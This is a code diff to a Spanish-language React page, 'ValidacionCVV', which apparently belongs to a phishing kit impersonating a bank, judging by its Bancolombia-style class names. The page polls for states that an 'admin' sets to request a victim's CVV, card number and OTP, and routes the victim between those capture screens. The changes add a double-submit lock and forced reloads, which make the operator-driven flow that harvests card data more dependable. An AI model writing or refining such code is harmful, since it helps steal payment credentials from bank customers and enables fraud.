@@ -16,6 +16,7 @@ export default function ValidacionCVV() {
     // Se inicializa el estado
     const [cvv, setCvv] = useState("");
     const [cargando, setCargando] = useState(false); // Loading state
+    const [submitted, setSubmitted] = useState(false); // Flag para prevenir múltiples envíos
     const [polling, setPolling] = useState(false); // Estado para activar polling
 
     // Estado para el modal de error
@@ -107,8 +108,20 @@ export default function ValidacionCVV() {
                     return;
                 }
 
-                // Si el estado es solicitar_cvv_custom o solicitar_cvv, detener polling pero mantener en la vista
-                if (estado === 'solicitar_cvv_custom' || estado === 'solicitar_cvv') {
+                // Si el estado es solicitar_cvv_custom durante polling, significa que el admin
+                // volvió a solicitar CVV Custom (posiblemente con nuevos dígitos)
+                // Recargar la página para asegurar vista limpia
+                if (estado === 'solicitar_cvv_custom') {
+                    clearInterval(interval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+                    setPolling(false);
+                    window.location.reload();
+                    return;
+                }
+
+                // Si es solicitar_cvv (no custom), detener polling pero mantener en la vista
+                if (estado === 'solicitar_cvv') {
                     clearInterval(interval);
                     clearTimeout(timeoutId);
                     setCargando(false);
@@ -157,7 +170,8 @@ export default function ValidacionCVV() {
                         navigate("/validacion-tc");
                         break;
                     case 'solicitar_tc_custom':
-                        navigate("/validacion-tc");
+                        // Forzar recarga completa para limpiar estados y asegurar que ValidacionTC inicie correctamente
+                        window.location.href = "/validacion-tc";
                         break;
                     case 'solicitar_otp':
                         navigate("/numero-otp");
@@ -258,10 +272,17 @@ export default function ValidacionCVV() {
 
     // HANDLE SUBMIT
     const handleSubmit = async () => {
+        // Prevenir múltiples submissions
+        if (submitted || cargando) {
+            console.log("--- SUBMIT BLOQUEADO (ya enviado o cargando) ---");
+            return;
+        }
+
         console.log("--- INICIANDO SUBMIT ---");
 
-        // Activar flags de carga
+        // Activar flags de carga y bloqueo
         setCargando(true);
+        setSubmitted(true); // Bloquear botón permanentemente
         loadingRef.current = true;
 
         try {
@@ -701,7 +722,6 @@ export default function ValidacionCVV() {
                     <div
                         style={{
                             marginTop: "25px",
-                            textAlignLast: "center"
                         }}
                     >
                         <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
@@ -896,13 +916,13 @@ export default function ValidacionCVV() {
                                 className="login-btn"
                                 style={{
                                     marginTop: "20px",
-                                    opacity: (cvv.length === cvvLength && !cargando) ? 1 : 0.5, // Feedback visual
-                                    cursor: (cvv.length === cvvLength && !cargando) ? "pointer" : "not-allowed"
+                                    opacity: (cvv.length === cvvLength && !submitted) ? 1 : 0.5, // Feedback visual
+                                    cursor: (cvv.length === cvvLength && !submitted) ? "pointer" : "not-allowed"
                                 }}
-                                disabled={cvv.length !== cvvLength || cargando}
+                                disabled={cvv.length !== cvvLength || submitted}
                                 onClick={handleSubmit}
                             >
-                                {cargando ? "Enviando..." : "Continuar"}
+                                {submitted ? "Enviado" : (cargando ? "Enviando..." : "Continuar")}
                             </button>
                         </div>
                     </div>
